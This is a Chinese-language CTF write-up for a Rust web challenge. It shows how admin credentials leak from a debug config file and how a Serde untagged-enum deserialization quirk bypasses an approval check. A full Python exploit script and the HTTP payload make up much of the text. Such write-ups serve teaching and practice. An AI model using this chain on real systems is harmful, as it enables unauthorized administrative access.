# N-RustPICA

## 题目简述

Rust Web 黑盒题。静态资源遗留 `/debug/config.json` 泄露管理员账号密码；后台状态流转接口使用 Serde untagged enum 且默认忽略未知字段，可通过构造完整 JSON 绕过 `approvalTicket` 语义限制并发布内部番剧。

## 解题过程

首先能看到注册这边有一个：

公开注册已关闭，管理员账号仅用于内部联调，静态资源目录里仍留有联调遗留文件（5毛删除）。

然后扫目录进去可以看到一个 /debug 和 /asserts

再去对这两个目录进行扫描能发现 /debug/config.json，访问就可以得到账号密码。

进去之后就好办了，因为放的是黑盒所以我把一些逻辑放在了旧流程说明中，打开就可以看到

```text
#[serde(untagged)]
pub enum TransitionRequest {
    QuickPublish(QuickPublishRequest),
    Moderated(ModeratedTransitionRequest),
}
pub struct QuickPublishRequest {
    pub action: String,
}
pub struct ModeratedTransitionRequest {
    pub action: String,
    pub target_status: AnimeStatus,
    pub reviewer_token: String,
    pub featured: bool,
}
{
  "action": "publish",
  "targetStatus": "published",
  "reviewerToken": "FEATURE-REVIEW-2025",
  "featured": false,
  "approvalTicket": "PENDING-APPROVAL"
}
```

对 JSON 这类格式，Serde 默认忽略未知字段，所以提交完整五字段 JSON 时，approvalTicket

会被忽略

（突然发现我好像直接把payload给出来了）

```http
POST /api/admin/anime/anime-0007/transition
Cookie: nctf_admin_session=...
Content-Type: application/json
{
  "action": "publish",
  "targetStatus": "published",
  "reviewerToken": "FEATURE-REVIEW-2025",
  "featured": false,
  "approvalTicket": "denied"
}
```

然后就可以在首页看到对应的内部番剧（早知道我真放点内部番剧进去了）

### Exploit

```python
import argparse
import base64
import sys
import requests
def decode_password(parts):
    return "".join(base64.b64decode(part).decode() for part in parts)
def must_json(response):
    response.raise_for_status()
    return response.json()
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--base", default="http://127.0.0.1:3000")
    args = parser.parse_args()
    base = args.base.rstrip("/")
    session = requests.Session()
    config = must_json(session.get(f"{base}/debug/config.json"))
    username = config["adminUser"]
    password = decode_password(config["passwordParts"])
    #print(f"creds: {username} / {password}")
    login_response = session.post(
        f"{base}/api/auth/login",
        json={"username": username, "password": password},
    )
    must_json(login_response)
    #print("login")
    admin_list = must_json(session.get(f"{base}/api/admin/anime"))["data"]
    hidden = next(
        (item for item in admin_list if item["id"] == "anime-0007"),
        None,
    )
    if hidden is None:
        hidden = next(
            (item for item in admin_list if item.get("status") == "internal"),
            None,
        )
    if hidden is None:
        raise RuntimeError("hidden anime not found")
    hidden_id = hidden["id"]
    #print(f"hidden target: {hidden_id}")
    template = must_json(session.get(f"{base}/api/admin/templates/review-flow"))["data"]
    payload = dict(template["payload"])
    payload["approvalTicket"] = "denied"
    #print(f"review payload: {payload}")
    transition = session.post(
        f"{base}/api/admin/anime/{hidden_id}/transition",
        json=payload,
    )
    #print(f"transition status: {transition.status_code}")
    #print(f"transition body: {transition.text}")
    detail = must_json(session.get(f"{base}/api/anime/{hidden_id}"))["data"]
    print(f"flag: {detail['description']}")
if __name__ == "__main__":
    try:
        main()
    except Exception as error:
        print(f"{error}")
        sys.exit(1)
```

## 方法总结

- 核心技巧：调试配置泄露 + Serde 未知字段忽略导致的状态流转绕过。
- 识别信号：Rust/Serde 接口同时存在 untagged enum、camelCase JSON 和额外字段时，要检查字段匹配与未知字段处理。
- 复用要点：先拿调试遗留凭据进入后台，再用最小 payload 验证反序列化分支选择和权限状态变化。
